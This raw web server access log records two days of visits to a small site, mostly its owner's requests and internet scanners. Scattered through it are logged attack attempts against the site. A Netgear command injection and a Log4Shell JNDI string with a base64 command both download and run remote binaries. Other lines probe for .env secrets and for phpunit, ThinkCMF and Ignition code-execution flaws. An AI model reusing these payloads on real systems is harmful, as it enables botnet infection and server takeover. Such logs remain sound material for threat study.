98.248.133.252 - - [04/Apr/2022:09:55:02 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:09:55:10 +0000] "GET /Filter HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:09:55:14 +0000] "GET /filter HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:09:55:49 +0000] "GET /Filter HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:09:56:12 +0000] "GET /pages HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:09:57:03 +0000] "-" 408 0 "-" "-"
51.254.59.113 - - [04/Apr/2022:09:57:56 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
98.248.133.252 - - [04/Apr/2022:09:58:39 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:09:58:45 +0000] "GET /filter HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:09:58:49 +0000] "GET /Filter HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:09:59:41 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [04/Apr/2022:10:01:59 +0000] "GET /Filter HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:10:02:03 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:10:02:55 +0000] "-" 408 0 "-" "-"
45.155.204.146 - - [04/Apr/2022:10:04:08 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
98.248.133.252 - - [04/Apr/2022:10:07:12 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
45.146.164.234 - - [04/Apr/2022:10:07:36 +0000] "GET / HTTP/1.0" 500 707 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
167.249.102.193 - - [04/Apr/2022:10:07:55 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
98.248.133.252 - - [04/Apr/2022:10:08:03 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [04/Apr/2022:10:10:14 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:10:11:06 +0000] "-" 408 0 "-" "-"
190.4.51.242 - - [04/Apr/2022:10:42:58 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
98.248.133.252 - - [04/Apr/2022:11:03:44 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:11:04:35 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [04/Apr/2022:11:05:50 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:11:06:42 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [04/Apr/2022:11:08:39 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:11:09:30 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [04/Apr/2022:11:10:32 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:11:11:23 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [04/Apr/2022:11:13:18 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:11:14:10 +0000] "-" 408 0 "-" "-"
182.253.140.162 - - [04/Apr/2022:11:14:30 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
98.248.133.252 - - [04/Apr/2022:11:14:36 +0000] "GET / HTTP/1.1" 500 707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:11:15:28 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [04/Apr/2022:11:15:39 +0000] "GET / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:11:15:55 +0000] "GET /Filter HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:11:16:09 +0000] "GET /filter HTTP/1.1" 200 1243 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:11:16:09 +0000] "GET /static/styles/filter.css HTTP/1.1" 200 718 "http://34.102.11.81/filter" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:11:17:00 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [04/Apr/2022:11:22:30 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [04/Apr/2022:11:22:30 +0000] "-" 408 0 "-" "-"
185.254.196.223 - - [04/Apr/2022:12:18:22 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [04/Apr/2022:12:18:26 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
77.247.127.68 - - [04/Apr/2022:12:40:45 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
77.247.127.68 - - [04/Apr/2022:12:40:46 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
172.104.138.223 - - [04/Apr/2022:13:01:09 +0000] "GET /fuN3 HTTP/1.0" 404 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
128.14.209.162 - - [04/Apr/2022:13:02:46 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
192.3.221.149 - - [04/Apr/2022:14:03:53 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.3.221.149 - - [04/Apr/2022:14:03:53 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
221.226.14.142 - - [04/Apr/2022:14:11:48 +0000] "GET / HTTP/1.1" 404 428 "-" "-"
61.147.15.67 - - [04/Apr/2022:14:12:48 +0000] "GET / HTTP/1.1" 404 428 "-" "Dalvik/2.1.0 (Linux; U; Android 9.0; ZTE BA520 Build/MRA58K)"
61.147.15.67 - - [04/Apr/2022:14:13:01 +0000] "\x16\x03\x01" 400 0 "-" "-"
61.147.15.65 - - [04/Apr/2022:14:13:14 +0000] "GET /favicon.ico HTTP/1.1" 404 428 "-" "Dalvik/2.1.0 (Linux; U; Android 9.0; ZTE BA520 Build/MRA58K)"
61.147.15.67 - - [04/Apr/2022:14:13:20 +0000] "\x16\x03\x01" 400 0 "-" "-"
61.147.15.65 - - [04/Apr/2022:14:13:44 +0000] "\x16\x03\x01" 400 0 "-" "-"
61.147.15.67 - - [04/Apr/2022:14:14:45 +0000] "GET / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27"
104.208.167.19 - - [04/Apr/2022:14:28:22 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
104.208.167.19 - - [04/Apr/2022:14:28:22 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.248.133.118 - - [04/Apr/2022:14:37:07 +0000] "GET / HTTP/1.1" 404 372 "-" "-"
167.248.133.118 - - [04/Apr/2022:14:37:07 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.118 - - [04/Apr/2022:14:37:07 +0000] "PRI * HTTP/2.0" 400 0 "-" "-"
104.168.32.20 - - [04/Apr/2022:15:03:41 +0000] "HEAD / HTTP/1.1" 404 140 "-" "Python/3.7 aiohttp/3.7.4.post0"
104.168.32.20 - - [04/Apr/2022:15:03:41 +0000] "GET /.env HTTP/1.1" 404 372 "-" "Python/3.7 aiohttp/3.7.4.post0"
104.168.32.20 - - [04/Apr/2022:15:03:41 +0000] "POST / HTTP/1.1" 404 372 "-" "Python/3.7 aiohttp/3.7.4.post0"
185.254.196.223 - - [04/Apr/2022:15:19:35 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [04/Apr/2022:15:19:37 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
170.130.187.2 - - [04/Apr/2022:17:29:57 +0000] "GET / HTTP/1.0" 404 391 "-" "https://gdnplus.com:Gather Analyze Provide."
183.136.225.42 - - [04/Apr/2022:18:00:49 +0000] "GET / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.42 - - [04/Apr/2022:18:01:14 +0000] "GET /favicon.ico HTTP/1.1" 404 391 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
185.254.196.223 - - [04/Apr/2022:18:20:13 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [04/Apr/2022:18:20:15 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
41.86.18.133 - - [04/Apr/2022:18:20:21 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://41.86.18.133:43144/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 391 "-" "-"
62.171.147.55 - - [04/Apr/2022:18:36:54 +0000] "CONNECT 62.171.147.55:85 HTTP/1.1" 404 372 "-" "-"
45.146.164.234 - - [04/Apr/2022:18:40:30 +0000] "GET / HTTP/1.0" 404 391 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
92.118.39.180 - - [04/Apr/2022:18:43:36 +0000] "GET /admin/config.php HTTP/1.1" 400 0 "-" "gbrmss/7.29.0"
209.17.96.26 - - [04/Apr/2022:18:50:05 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
198.244.142.77 - - [04/Apr/2022:19:10:59 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.244.142.77 - - [04/Apr/2022:19:11:00 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.17.96.42 - - [04/Apr/2022:19:41:24 +0000] "GET / HTTP/1.0" 404 391 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
141.94.26.194 - - [04/Apr/2022:20:12:03 +0000] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
162.142.125.220 - - [04/Apr/2022:20:30:34 +0000] "GET / HTTP/1.1" 404 372 "-" "-"
162.142.125.220 - - [04/Apr/2022:20:30:34 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.220 - - [04/Apr/2022:20:30:35 +0000] "PRI * HTTP/2.0" 400 0 "-" "-"
157.230.216.203 - - [04/Apr/2022:20:45:24 +0000] "GET /ab2g HTTP/1.1" 400 0 "-" "-"
157.230.216.203 - - [04/Apr/2022:20:45:24 +0000] "GET /ab2h HTTP/1.1" 400 0 "-" "-"
192.241.224.231 - - [04/Apr/2022:20:58:13 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 zgrab/0.x"
162.142.125.222 - - [04/Apr/2022:21:08:27 +0000] "GET / HTTP/1.1" 404 372 "-" "-"
162.142.125.222 - - [04/Apr/2022:21:08:27 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.222 - - [04/Apr/2022:21:08:27 +0000] "PRI * HTTP/2.0" 400 0 "-" "-"
185.254.196.223 - - [04/Apr/2022:21:19:06 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [04/Apr/2022:21:19:07 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.124.133.132 - - [04/Apr/2022:21:55:55 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.124.133.132 - - [04/Apr/2022:21:55:55 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
81.97.9.118 - - [04/Apr/2022:22:04:47 +0000] "GET / HTTP/1.1" 404 372 "-" "-"
92.118.161.25 - - [04/Apr/2022:22:12:15 +0000] "GET / HTTP/1.1" 404 372 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
61.219.11.152 - - [04/Apr/2022:22:12:42 +0000] "-" 408 0 "-" "-"
103.70.145.149 - - [04/Apr/2022:22:31:37 +0000] "-" 408 0 "-" "-"
98.248.133.252 - - [04/Apr/2022:22:40:24 +0000] "GET /filter HTTP/1.1" 200 1243 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:22:40:24 +0000] "GET /static/styles/filter.css HTTP/1.1" 200 718 "http://34.102.11.81/filter" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:22:40:24 +0000] "GET /favicon.ico HTTP/1.1" 404 427 "http://34.102.11.81/filter" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [04/Apr/2022:22:41:15 +0000] "-" 408 0 "-" "-"
94.232.41.210 - - [04/Apr/2022:22:48:53 +0000] "\x03" 400 0 "-" "-"
45.155.204.146 - - [04/Apr/2022:23:56:09 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
77.247.127.68 - - [04/Apr/2022:23:57:11 +0000] "GET /.env HTTP/1.1" 404 428 "-" "python-requests/2.27.1"
77.247.127.68 - - [04/Apr/2022:23:57:11 +0000] "GET /.env HTTP/1.1" 404 428 "-" "python-requests/2.27.1"
77.247.127.68 - - [04/Apr/2022:23:57:12 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 428 "-" "python-requests/2.27.1"
190.130.28.110 - - [05/Apr/2022:00:03:47 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
128.14.134.134 - - [05/Apr/2022:00:06:02 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.155.204.146 - - [05/Apr/2022:00:14:54 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [05/Apr/2022:00:19:45 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [05/Apr/2022:00:19:48 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
144.22.198.141 - - [05/Apr/2022:00:26:47 +0000] "GET / HTTP/1.1" 404 391 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvaW5pdDIzOyBjdXJsIC1PIGh0dHA6Ly8xNDAuMjM4LjE4MC4zNC9pbml0MjM7IGNobW9kIDc3NyBpbml0MjM7IC4vaW5pdDIzIHJ1bm5lcg==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvaW5pdDIzOyBjdXJsIC1PIGh0dHA6Ly8xNDAuMjM4LjE4MC4zNC9pbml0MjM7IGNobW9kIDc3NyBpbml0MjM7IC4vaW5pdDIzIHJ1bm5lcg==}')"
45.155.204.146 - - [05/Apr/2022:00:40:57 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.81.51.39 - - [05/Apr/2022:00:59:13 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.81.51.39 - - [05/Apr/2022:00:59:13 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
89.248.165.52 - - [05/Apr/2022:01:04:01 +0000] "-" 408 0 "-" "-"
89.248.165.52 - - [05/Apr/2022:01:04:21 +0000] "-" 408 0 "-" "-"
89.248.165.52 - - [05/Apr/2022:01:04:21 +0000] "CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1" 404 372 "-" "-"
90.189.194.185 - - [05/Apr/2022:01:06:35 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
115.52.15.101 - - [05/Apr/2022:01:08:04 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 391 "-" "-"
162.142.125.9 - - [05/Apr/2022:01:27:11 +0000] "GET / HTTP/1.1" 404 372 "-" "-"
162.142.125.9 - - [05/Apr/2022:01:27:11 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.9 - - [05/Apr/2022:01:27:11 +0000] "PRI * HTTP/2.0" 400 0 "-" "-"
206.189.224.36 - - [05/Apr/2022:01:32:57 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
206.189.224.36 - - [05/Apr/2022:01:32:57 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.155.204.146 - - [05/Apr/2022:01:49:52 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 404 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.204.146 - - [05/Apr/2022:02:53:47 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
37.0.11.224 - - [05/Apr/2022:02:54:49 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 391 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
49.143.32.6 - - [05/Apr/2022:02:56:37 +0000] "POST /HNAP1/ HTTP/1.0" 408 391 "-" "-"
185.49.93.92 - - [05/Apr/2022:03:02:09 +0000] "GET / HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.155.204.146 - - [05/Apr/2022:03:13:47 +0000] "GET /console/ HTTP/1.1" 404 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [05/Apr/2022:03:19:45 +0000] "GET /.env HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [05/Apr/2022:03:19:46 +0000] "POST / HTTP/1.1" 404 428 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
110.40.132.146 - - [05/Apr/2022:03:26:00 +0000] "GET /index.php HTTP/1.1" 404 428 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
110.40.132.146 - - [05/Apr/2022:03:26:00 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 372 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
45.155.204.146 - - [05/Apr/2022:03:40:26 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
178.73.215.171 - - [05/Apr/2022:03:59:08 +0000] "GET / HTTP/1.0" 404 391 "-" "-"
45.137.21.166 - - [05/Apr/2022:04:24:57 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 428 "http://34.102.11.81:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.155.204.146 - - [05/Apr/2022:04:25:35 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
